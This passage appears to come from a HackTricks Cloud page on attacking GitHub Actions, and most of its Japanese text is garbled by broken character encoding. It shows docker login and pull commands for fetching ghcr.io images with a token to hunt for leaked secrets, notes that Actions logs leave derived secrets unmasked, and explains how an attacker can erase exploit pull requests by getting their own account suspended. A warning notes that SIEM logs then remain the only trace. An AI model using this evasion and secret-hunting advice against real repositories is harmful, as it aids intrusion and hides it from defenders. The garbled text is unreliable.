ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

å‰ã®ã‚³ãƒ¼ãƒ‰ã§è¦‹ãŸã‚ˆã†ã«ã€Githubãƒ¬ã‚¸ã‚¹ãƒˆãƒªã¯**`ghcr.io`**ã«ãƒ›ã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚

ãƒªãƒã‚¸ãƒˆãƒªã«å¯¾ã™ã‚‹èª­ã¿å–ã‚Šæ¨©é™ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€å€‹äººã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦Dockerã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actionsãƒ­ã‚°ã®æ©Ÿå¯†æƒ…å ±

ãŸã¨ãˆ**Github**ãŒã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãƒ­ã‚°å†…ã®**ç§˜å¯†ã®å€¤**ã‚’**æ¤œå‡ºã—**ã€**è¡¨ç¤ºã‚’é¿ã‘ã‚ˆã†**ã¨ã—ã¦ã‚‚ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®å®Ÿè¡Œä¸­ã«ç”Ÿæˆã•ã‚ŒãŸ**ä»–ã®æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿**ã¯éš ã•ã‚Œã¾ã›ã‚“ã€‚ãŸã¨ãˆã°ã€ç§˜å¯†ã®å€¤ã§ç½²åã•ã‚ŒãŸJWTã¯ã€[ç‰¹ã«è¨­å®šã•ã‚Œãªã„é™ã‚Š](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)ã€éš ã•ã‚Œã¾ã›ã‚“ã€‚

## è¶³è·¡ã‚’éš ã™

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) ã¾ãšç¬¬ä¸€ã«ã€æå‡ºã•ã‚ŒãŸPRã¯Githubä¸Šã§å…¬é–‹ã•ã‚Œã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã®GitHubã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚‚æ˜ã‚‰ã‹ã«è¦‹ãˆã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€GitHubã§ã¯**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®PRã‚’å‰Šé™¤ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“**ãŒã€ã²ã­ã‚ŠãŒã‚ã‚Šã¾ã™ã€‚Githubã«ã‚ˆã£ã¦**åœæ­¢ã•ã‚ŒãŸ**GitHubã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®å ´åˆã€ã™ã¹ã¦ã®**PRã¯è‡ªå‹•çš„ã«å‰Šé™¤**ã•ã‚Œã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‹ã‚‰å–ã‚Šé™¤ã‹ã‚Œã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€æ´»å‹•ã‚’éš ã™ãŸã‚ã«ã¯ã€**GitHubã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’åœæ­¢ã•ã›ã‚‹ã‹ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ãƒ•ãƒ©ã‚°ä»˜ã‘ã•ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€GitHubä¸Šã®**ã™ã¹ã¦ã®æ´»å‹•ãŒ**ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã‹ã‚‰éš ã•ã‚Œã¾ã™ï¼ˆåŸºæœ¬çš„ã«ã™ã¹ã¦ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆPRã‚’å‰Šé™¤ã—ã¾ã™ï¼‰ã€‚

GitHubã®çµ„ç¹”ã¯ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’GitHubã«å ±å‘Šã™ã‚‹ã“ã¨ã«éå¸¸ã«ç©æ¥µçš„ã§ã™ã€‚å¿…è¦ãªã®ã¯ã€Issueã«ã€Œã„ãã¤ã‹ã®ã‚‚ã®ã€ã‚’å…±æœ‰ã™ã‚‹ã ã‘ã§ã€å½¼ã‚‰ã¯ã‚ãªãŸã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãŒ12æ™‚é–“ä»¥å†…ã«åœæ­¢ã•ã‚Œã‚‹ã“ã¨ã‚’ç¢ºå®Ÿã«ã—ã¾ã™ :p ã“ã‚Œã§ã€ã‚ãªãŸã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯GitHubä¸Šã§è¦‹ãˆãªããªã‚Šã¾ã™ã€‚

{% hint style="warning" %}
çµ„ç¹”ãŒã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã•ã‚ŒãŸã“ã¨ã‚’æŠŠæ¡ã™ã‚‹å”¯ä¸€ã®æ–¹æ³•ã¯ã€GitHub UIã‹ã‚‰PRãŒå‰Šé™¤ã•ã‚Œã‚‹ãŸã‚ã€SIEMã‹ã‚‰GitHubãƒ­ã‚°ã‚’ç¢ºèªã™ã‚‹ã“ã¨ã§ã™ã€‚
{% endhint %}

## ãƒ„ãƒ¼ãƒ«

ä»¥ä¸‹ã®ãƒ„ãƒ¼ãƒ«ã¯ã€Github Actionãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’è¦‹ã¤ã‘ãŸã‚Šã€è„†å¼±ãªã‚‚ã®ã‚’è¦‹ã¤ã‘ãŸã‚Šã™ã‚‹ã®ã«å½¹ç«‹ã¡ã¾ã™ï¼š

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
* [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
